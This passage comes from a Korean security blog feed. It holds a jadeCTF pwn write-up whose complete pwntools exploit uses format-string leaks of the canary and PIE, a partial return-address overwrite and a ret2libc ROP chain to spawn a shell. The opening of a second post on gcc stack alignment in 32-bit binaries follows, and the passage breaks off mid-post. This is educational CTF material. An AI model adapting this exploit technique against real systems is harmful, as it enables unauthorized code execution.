필요하다.</p><p>아래부터 remote 기준으로 설명을 한다.</p><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ul><li>사전 작업: fsb를 이용하여 canary, pie offset 찾기</li></ul><ol><li>canary leak하고 main으로 돌리기</li><li>pie leak하고 main으로 돌리기</li><li>got 출력해서 libc 구하기</li><li><code>system(&#39;/bin/sh\x00&#39;)</code>으로 흐름 돌리기</li></ol><h3 id="pre-work"><a href="#pre-work" class="headerlink" title="pre-work"></a>pre-work</h3><h4 id="leak-canary-amp-pie"><a href="#leak-canary-amp-pie" class="headerlink" title="leak canary &amp; pie"></a>leak canary &amp; pie</h4><p>canary leak을 위한 코드는 아래와 같다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10003</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">off = <span class="number">30</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        find_canary = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(off)+<span class="string">&#x27;$p&#x27;</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;]?\n&#x27;</span>, find_canary)</span><br><span class="line">        off = off+<span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        leak = p.recvline()</span><br><span class="line">        canary = <span class="built_in">int</span>(leak[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(off-<span class="number">1</span>, <span class="built_in">hex</span>(canary))</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#log.info(hex(canary))</span></span><br><span class="line">        </span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;correct?\n&#x27;</span>, <span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x210</span>-<span class="number">0x8</span>)</span><br><span class="line">        payload += p64(canary)</span><br><span class="line">        payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">        payload += <span class="string">b&#x27;\x78\x15&#x27;</span> <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;:\n&#x27;</span>, payload)</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;]?\n&#x27;</span>)             <span class="comment">######## !!! ########</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10003</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>제일 먼저 해야할 일은 canary를 leak하는 것이다. offset을 찾기 위해서 루프를 돌 때 try-except을 이용해서 예외처리를 해주었다. 만약 예외가 발생한다면 다시 remote에 연결해주었는데, <code>p.close()</code>를 안해준다면 프로세스가 계속 살아있기 때문에 remote에 새로 연결해주기 전에 close를 해주어야 한다.</p><p>fsb를 이용해서 leak하고 유효한 주소를 가져오는 과정에서 예외가 발생할 가능성이 존재한다. 주소를 출력할 때 16진수 값이거나 <code>(nil)</code>을 출력해주는데 후자일 경우 <code>int(leak, 16)</code>에서 에러가 발생하기 때문에 except으로 가서 예외처리를 해줄 수 있다. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to 34.76.206.46 on port 10003: Done</span><br><span class="line">invalid literal for int() with base 16: b&#x27;il)\n&#x27;</span><br><span class="line">[*] Closed connection to 34.76.206.46 port 10003</span><br></pre></td></tr></table></figure><p>루프가 끝나고 pause를 해줬기 때문에 멈추는 곳을 보면 바로 canary를 찾을 수 있다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to 34.76.206.46 on port 10003: Done</span><br><span class="line">77 0x8a3ffc38e32e9500</span><br><span class="line">[*] Paused (press any to continue)</span><br></pre></td></tr></table></figure><p>offset은 77임을 바로 알 수 있다. </p><p>pause하는 조건은 주석에 <code>!!!</code>한 곳을 보면 알 수 있다. <code>]?\n</code>은 이 함수 초반에 출력하는 문자열 중 일부이다. ret를 이 함수로 돌려주었기 때문에 이것이 출력된다면 leak한 값이 canary임을 바로 확인할 수 있다.</p><p>사실 canary가 구해져도 바로 ret로 돌릴 수가 없다. 왜냐하면 pie base의 값이 랜덤이기 때문에 아래와 같은 base이길 기대해야한다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x561aa9000000</span><br></pre></td></tr></table></figure><p>내가 돌리고 싶은 주소는 <code>pie_base + 0x1578</code>인데 디버깅을 하다보면 <code>0x01578</code>이 고정인 것을 알 수 있다. 2.5바이트가 고정인데 0.5바이트만 쓸 수 없으니 2바이트만 덮을 수 있다. ret를 2바이트만 덮으면 어차피 끝에 null이 자동으로 붙기 때문에 1&#x2F;16의 확률로 내가 원하는 함수로 흐름을 돌릴 수 있게 된다.</p><p>canary leak을 성공하고 흐름 돌리는 것도 성공하면 이제 pie leak을 하면 된다. pie leak도 canary를 leak한 것과 동일하게 진행하면 된다. 다만 차이점은 canary는 rip를 바꾸면서 검증이 바로 되어서 알 수 있는 반면에 pie는 offset과 함께 출력해주면서 pie 주소인 것을 leak하면 된다.</p><p>그렇게 구한 leak할 pie offset은 85이다.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><p>문제 풀 때의 기억을 살리고 싶어서 그 때 작성했던 익스 코드를 그대로 올린다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10003</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">off = <span class="number">30</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        off = <span class="number">77</span></span><br><span class="line">        find_canary = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(off)+<span class="string">&#x27;$p&#x27;</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;]?\n&#x27;</span>, find_canary)</span><br><span class="line">        <span class="comment">#off = off+1</span></span><br><span class="line">        </span><br><span class="line">        p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        leak = p.recvline()</span><br><span class="line">        canary = <span class="built_in">int</span>(leak[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#print(off, hex(canary))</span></span><br><span class="line">        </span><br><span class="line">        log.info(<span class="built_in">hex</span>(canary))</span><br><span class="line">        </span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;correct?\n&#x27;</span>, <span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x210</span>-<span class="number">0x8</span>)</span><br><span class="line">        payload += p64(canary)</span><br><span class="line">        payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">        payload += <span class="string">b&#x27;\x78\x15&#x27;</span></span><br><span class="line"></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;:\n&#x27;</span>, payload)</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;]?\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10003</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">off = 30</span></span><br><span class="line"><span class="string">while 1:</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        off = 85 </span></span><br><span class="line"><span class="string">        find_pie = &#x27;%&#x27;+str(off)+&#x27;$p&#x27;</span></span><br><span class="line"><span class="string">        p.sendline(find_pie)</span></span><br><span class="line"><span class="string">        #off = off+1</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        p.recvuntil(&#x27;: &#x27;)</span></span><br><span class="line"><span class="string">        leak = p.recvline()</span></span><br><span class="line"><span class="string">        pie = int(leak[2:],16)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        print(off, hex(pie))</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        p.sendlineafter(&#x27;correct?\n&#x27;, b&#x27;yes&#x27;)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        payload = b&#x27;&#x27;</span></span><br><span class="line"><span class="string">        payload += b&#x27;A&#x27; * (0x210-0x8)</span></span><br><span class="line"><span class="string">        payload += p64(canary)</span></span><br><span class="line"><span class="string">        payload += b&#x27;B&#x27; * 0x8</span></span><br><span class="line"><span class="string">        payload += b&#x27;\x78\x15&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        p.sendlineafter(&#x27;:\n&#x27;, payload)</span></span><br><span class="line"><span class="string">        p.recvuntil(&#x27;]?\n&#x27;)</span></span><br><span class="line"><span class="string">        continue</span></span><br><span class="line"><span class="string">    except Exception as e:</span></span><br><span class="line"><span class="string">        print(e)</span></span><br><span class="line"><span class="string">        p.close()</span></span><br><span class="line"><span class="string">        #p = process(&#x27;./chall&#x27;)</span></span><br><span class="line"><span class="string">        p = remote(&#x27;34.76.206.46&#x27;, 10003)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"><span class="comment">#exit(0)</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;%85$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">pie = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x1577</span></span><br><span class="line">info(<span class="built_in">hex</span>(pie))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;ct?\n&#x27;</span>, <span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = pie+<span class="number">0x1663</span></span><br><span class="line">ret = pie+<span class="number">0x909</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x210</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span></span><br><span class="line"><span class="comment">#payload += p64(ret)</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(pie + elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(pie + elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(pie + elf.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvline()</span></span><br><span class="line"><span class="comment">#leak = int(p.recv(14)[:-1].decode(), 16)</span></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;puts leak :: &#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line"><span class="comment">#puts 6a0</span></span><br><span class="line"><span class="comment">#gets d90</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">libc_base = leak - libc.symbols[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">info(&#x27;libc base :: &#x27;+ hex(libc_base))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">system = libc_base + libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">binsh = libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">system = leak - <span class="number">0x2a300</span></span><br><span class="line">binsh = leak + <span class="number">0x11d7b7</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;asdf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;ct?\n&#x27;</span>, <span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x210</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jadeCTF&#123;sh3llc0ding_but_w1th_4_tw1st&#125;</span><br></pre></td></tr></table></figure><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><p>롸업 적으니까 이 문제는 매우 간단한 문제임을 깨달았다. 부끄럽지만 pie가 걸려있는데 어떻게 ROP를 해야할지 고민을 했다. 일단 local에서 진행할 때도 마지막 2 바이트만 덮을 생각을 못했었고, local 후에 remote의 libc가 다른데 pie가 걸려있는데 그걸 어떻게 알아내야 하는지.. 등등 고민을 꽤나 했다. (offset을 브포하면 된다.)</p><p>이 문제 덕에 주소 일부만 덮을 수 있다는 생각과 루프, try-except 등을 이용하여 offset을 구하는 과정을 배울 수 있었다.</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Jade </category>
          
      </categories>
      
      
        <tags>
            
            <tag> canary </tag>
            
            <tag> fsb </tag>
            
            <tag> pie </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Stack Alignment in 32-bit program</title>
      <link href="/221020-32bit_stack_aligned/"/>
      <url>/221020-32bit_stack_aligned/</url>
      
        <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>부제: gcc 옵션 중 하나인 <code>-mpreferred-stack-boundary</code>에 대하여</p><p>Pwnable 문제를 풀다가 문득 32bit ROP를 살짝 잊었다는 기분이 들었다. (…) 예제 코드를 작성하고 그것을 익스하려고 했으나 생각대로 잘 되지 않아 분석을 진행하였다. 함수 프롤로그와 에필로그에 낯선 코드가 추가되어 있었고, 이 때문에 buf와 sfp 사이에 무언의 값이 들어있었다. 분석 결과, 원인은 gcc 옵션 중 하나인 <code>-mpreferred-stack-boundary</code> 때문임을 알게되었다. </p><p>Pwnable에서의 32bit 바이너리는 (거의) 대부분 <code>-mpreferred-stack-boundary=2</code> 옵션을 주고 컴파일을 한다.</p><h2 id="gcc-option-mpreferred-stack-boundary-N"><a href="#gcc-option-mpreferred-stack-boundary-N" class="headerlink" title="gcc option: -mpreferred-stack-boundary=N"></a>gcc option: <code>-mpreferred-stack-boundary=N</code></h2><p>Attempt to keep the stack boundary aligned to a 2 raised to num byte boundary.<br>If ‘-mpreferred-stack-boundary’ is not specified, the default is 4 (16 bytes or<br>128 bits).</p><ul><li>출처: <a href="https://gcc.gnu.org/onlinedocs/gcc-12.2.0/gcc.pdf">https://gcc.gnu.org/onlinedocs/gcc-12.2.0/gcc.pdf</a></li></ul><p>main을 포함하여 이후에 불리는 모든 함수들의 스택프레임에서 가장 낮은 주소가 2^N 에 배수가 되도록 align을 해준다.</p><p>컴파일할 때 저 옵션을 주지 않으면 <code>-mpreferred-stack-boundary=4</code>가 디폴트로 들어가게 된다. 그래서 스택 align이 16바이트로 맞춰지게 된다. </p><p>관련 코드는 아래와 같다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* Validate -mpreferred-stack-boundary= value or default it to</span></span><br><span class="line"><span class="comment">    PREFERRED_STACK_BOUNDARY_DEFAULT.  */</span></span><br><span class="line"> ix86_preferred_stack_boundary = PREFERRED_STACK_BOUNDARY_DEFAULT;</span><br><span class="line"> <span class="keyword">if</span> (opts_set-&gt;x_ix86_preferred_stack_boundary_arg)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="type">int</span> min = TARGET_64BIT_P (opts-&gt;x_ix86_isa_flags)? <span class="number">3</span> : <span class="number">2</span>;</span><br><span class="line">     <span class="type">int</span> max = TARGET_SEH ? <span class="number">4</span> : <span class="number">12</span>;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (opts-&gt;x_ix86_preferred_stack_boundary_arg &lt; min</span><br><span class="line">  || opts-&gt;x_ix86_preferred_stack_boundary_arg &gt; max)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (min == max)</span><br><span class="line">    error (<span class="string">&quot;%&lt;-mpreferred-stack-boundary%&gt; is not supported &quot;</span></span><br><span class="line">   <span class="string">&quot;for this target&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    error (<span class="string">&quot;%&lt;-mpreferred-stack-boundary=%d%&gt; is not between %d and %d&quot;</span>,</span><br><span class="line">   opts-&gt;x_ix86_preferred_stack_boundary_arg, min, max);</span><br><span class="line">&#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">ix86_preferred_stack_boundary</span><br><span class="line">  = (<span class="number">1</span> &lt;&lt; opts-&gt;x_ix86_preferred_stack_boundary_arg) * BITS_PER_UNIT;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ul><li><a href="https://github.com/gcc-mirror/gcc/blob/releases/gcc-12/gcc/config/i386/i386-options.cc#L2463">https://github.com/gcc-mirror/gcc/blob/releases/gcc-12/gcc/config/i386/i386-options.cc#L2463</a></li></ul><h1 id="Default-Stack-aligned-to-a-16-byte-boundary"><a href="#Default-Stack-aligned-to-a-16-byte-boundary" class="headerlink" title="(Default) Stack aligned to a 16-byte boundary."></a>(Default) Stack aligned to a 16-byte boundary.</h1><h3 id="disassemble-main"><a href="#disassemble-main" class="headerlink" title="disassemble main"></a>disassemble main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x080491f1</span> &lt;+<span class="number">0</span>&gt;:lea    ecx,[esp+<span class="number">0x4</span>]</span><br><span class="line"><span class="number">0x080491f5</span> &lt;+<span class="number">4</span>&gt;:and    esp,<span class="number">0xfffffff0</span></span><br><span class="line"><span class="number">0x080491f8</span> &lt;+<span class="number">7</span>&gt;:  push   DWORD PTR [ecx<span class="number">-0x4</span>]</span><br><span class="line"><span class="number">0x080491fb</span> &lt;+<span class="number">10</span>&gt;:push   ebp</span><br><span class="line"><span class="number">0x080491fc</span> &lt;+<span class="number">11</span>&gt;:mov    ebp,esp</span><br><span class="line"><span class="number">0x080491fe</span> &lt;+<span class="number">13</span>&gt;:push   ecx</span><br><span class="line"><span class="number">0x080491ff</span> &lt;+<span class="number">14</span>&gt;:sub    esp,<span class="number">0x44</span></span><br><span class="line"><span class="number">0x08049202</span> &lt;+<span class="number">17</span>&gt;:sub    esp,<span class="number">0x4</span></span><br><span class="line"><span class="number">0x08049205</span> &lt;+<span class="number">20</span>&gt;:push   <span class="number">0x40</span></span><br><span class="line"><span class="number">0x08049207</span> &lt;+<span class="number">22</span>&gt;:push   <span class="number">0x0</span></span><br><span class="line"><span class="number">0x08049209</span> &lt;+<span class="number">24</span>&gt;:lea    eax,[ebp<span class="number">-0x48</span>]</span><br><span class="line"><span class="number">0x0804920c</span> &lt;+<span class="number">27</span>&gt;:push   eax</span><br><span class="line"><span class="number">0x0804920d</span> &lt;+<span class="number">28</span>&gt;:call   <span class="number">0x8049080</span> &lt;<span class="built_in">memset</span>@plt&gt;</span><br><span class="line">...</span><br><span class="line"><span class="number">0x08049255</span> &lt;+<span class="number">100</span>&gt;:mov    ecx,DWORD PTR [ebp<span class="number">-0x4</span>]</span><br><span class="line"><span class="number">0x08049258</span> &lt;+<span class="number">103</span>&gt;:leave  </span><br><span class="line"><span class="number">0x08049259</span> &lt;+<span class="number">104</span>&gt;:lea    esp,[ecx<span class="number">-0x4</span>]</span><br><span class="line"><span class="number">0x0804925c</span> &lt;+<span class="number">107</span>&gt;:ret  </span><br></pre></td></tr></table></figure><h3 id="1-프롤로그-전-1"><a href="#1-프롤로그-전-1" class="headerlink" title="1. 프롤로그 전 (1)"></a>1. 프롤로그 전 (1)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">→  <span class="number">0x080491f1</span> &lt;+<span class="number">0</span>&gt; :lea    ecx,[esp+<span class="number">0x4</span>]</span><br><span class="line">   <span class="number">0x080491f5</span> &lt;+<span class="number">4</span>&gt; :and    esp,<span class="number">0xfffffff0</span></span><br><span class="line">   <span class="number">0x080491f8</span> &lt;+<span class="number">7</span>&gt; :push   DWORD PTR [ecx<span class="number">-0x4</span>]</span><br><span class="line">   <span class="number">0x080491fb</span> &lt;+<span class="number">10</span>&gt;:push   ebp</span><br><span class="line">   <span class="number">0x080491fc</span> &lt;+<span class="number">11</span>&gt;:mov    ebp,esp</span><br><span class="line">   <span class="number">0x080491fe</span> &lt;+<span class="number">13</span>&gt;:push   ecx  </span><br></pre></td></tr></table></figure><p>실행하고 난 후.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ecx  : 0xffffd960</span><br><span class="line">$esp  : 0xffffd95c</span><br></pre></td></tr></table></figure><p>ecx 레지스터를 사용하려고 하는걸까?</p><h3 id="2-프롤로그-전-2"><a href="#2-프롤로그-전-2" class="headerlink" title="2. 프롤로그 전 (2)"></a>2. 프롤로그 전 (2)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">0x080491f1</span> &lt;+<span class="number">0</span>&gt; :lea    ecx,[esp+<span class="number">0x4</span>]</span><br><span class="line">→  <span class="number">0x080491f5</span> 